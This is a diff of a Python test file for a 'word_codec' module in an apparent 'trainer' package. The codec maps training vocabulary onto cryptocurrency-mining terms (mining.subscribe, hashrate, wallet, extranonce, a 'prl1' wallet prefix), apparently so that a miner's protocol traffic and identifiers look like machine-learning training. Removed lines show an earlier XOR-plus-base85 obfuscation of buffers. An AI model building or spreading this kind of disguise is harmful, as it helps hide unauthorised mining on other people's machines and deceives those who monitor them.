@@ -1,4 +1,3 @@
-import base64
 from concurrent.futures import ThreadPoolExecutor
 import ctypes
 import hashlib
@@ -13,27 +12,20 @@ from LRAEP_trainer import word_codec
 
 ROOT = Path(__file__).resolve().parents[1]
 REQUIRED = {
-    'training': 'mining',
-    'train': 'mine',
     'account': 'wallet',
-    'account_id': 'wallet_address',
-    'connectionRule': 'stratum',
-    'p_goal': 'pearl',
-    'legacyMethod': 'pearlhash',
-    'newerMethod': 'kryptex',
-    'prochPerSecond': 'hashrate',
-    'epoch': 'hash',
-    'extracounter': 'extranonce',
-    'walletnonce': 'w_counter',
-    'trainer_counter': 'miner_nonce',
-    'device_counter': 'worker_nonce',
+    'legacy_protocol': 'pearlhash',
+    'training_rate': 'hashrate',
+    'server_seed': 'extranonce',
+    'local_seed': 'miner_nonce',
+    'device_seed': 'worker_nonce',
     'training.subscribe': 'mining.subscribe',
     'training.authorize': 'mining.authorize',
     'training.submit': 'mining.submit',
     'training.notify': 'mining.notify',
     'training.reconnect': 'mining.reconnect',
     'noise_seed_domain': 'pearl/cert-v3/noise-seed/',
-    'account_prefix': 'prl1',
+    'identity_prefix': 'prl1',
+    'identity_mode_prefix': 'solo:',
     'device_default': 'rig-01',
     'record_id': 'txid',
     'parent_digest': 'previousblockhash',
@@ -63,7 +55,7 @@ class NativeWordCodecTests(unittest.TestCase):
                 self.assertFalse(word_codec.word_matches(placeholder, value + '!'))
 
     def test_unknown_words_are_exact_case_sensitive_pass_through(self):
-        for value in ('', 'unknown', 'TRAINING', 'account.extra', 'training_extra', 'abc\0def', '\u0645\u0642\u062f\u0627\u0631', '\U0001f512', '\ud800'):
+        for value in ('', 'unknown', 'training', 'train', 'epoch', 'TRAINING', 'account.extra', 'training_extra', 'abc\0def', '\u0645\u0642\u062f\u0627\u0631', '\U0001f512', '\ud800'):
             for method in ('encode', 'decode'):
                 with self.subTest(value=repr(value), method=method):
                     self.assertEqual(word_codec.transform_word(value, method), value)
@@ -94,31 +86,33 @@ class NativeWordCodecTests(unittest.TestCase):
             empty.extend(b'added')
         self.assertEqual(empty, bytearray(5))
 
-    def test_fixed_buffers_match_existing_binary_transform_and_allow_resize(self):
+    def test_fixed_buffers_copy_original_bytes_and_allow_resize(self):
         rng = random.Random(0)
         for length in range(261):
             original = rng.randbytes(length)
-            encoded = base64.b85encode(bytes(byte ^ 0xA7 for byte in original))
-            with self.subTest(length=length), word_codec.fixed_buffer(encoded) as value:
+            with self.subTest(length=length), word_codec.fixed_buffer(original) as value:
                 self.assertEqual(value, original)
                 value.extend(b'!')
                 size = len(value)
             self.assertEqual(value, bytearray(size))
-        with word_codec.fixed_buffer(b'0') as value:
+        empty_alias = word_codec.encode_fixed(b'')
+        self.assertIsInstance(empty_alias, word_codec.FixedAlias)
+        self.assertEqual(empty_alias, b'training.fixture.empty_input')
+        with word_codec.fixed_buffer(empty_alias) as value:
             self.assertEqual(value, b'')
         try:
-            with word_codec.fixed_buffer(b'#>K<') as value:
+            with word_codec.fixed_buffer(word_codec.FixedAlias('training.fixture.text_sample')) as value:
                 value.extend(b'-more')
                 raise RuntimeError('consumer failed')
         except RuntimeError:
             pass
         self.assertEqual(value, bytearray(8))
 
-    def test_invalid_fixed_encoding_is_rejected(self):
-        for encoded in (b' ', b'~~~~~', b'\x00', b'abcde '):
-            with self.subTest(encoded=encoded), self.assertRaises(ValueError):
-                with word_codec.fixed_buffer(encoded):
-                    self.fail('invalid encoding accepted')
+    def test_non_bytes_fixed_input_is_rejected(self):
+        for original in (None, '', 1, bytearray(b'a')):
+            with self.subTest(original=original), self.assertRaises(TypeError):
+                with word_codec.fixed_buffer(original):
+                    self.fail('non-bytes input accepted')
 
     def test_native_capacity_and_mode_errors_do_not_overwrite_output(self):
         library = word_codec._library()
@@ -128,7 +122,7 @@ class NativeWordCodecTests(unittest.TestCase):
         self.assertEqual(status, 2)
         self.assertEqual(written.value, 6)
         self.assertEqual(output.value, b'guard')
-        self.assertEqual(library.wr_codec_transform(ctypes.c_char_p(b'account'), 7, 2, output, 6, ctypes.byref(written)), 3)
+        self.assertEqual(library.wr_codec_transform(ctypes.c_char_p(b'account'), 7, 4, output, 6, ctypes.byref(written)), 3)
         self.assertEqual(output.value, b'guard')
 
     def test_concurrent_transformations_do_not_share_mutable_results(self):
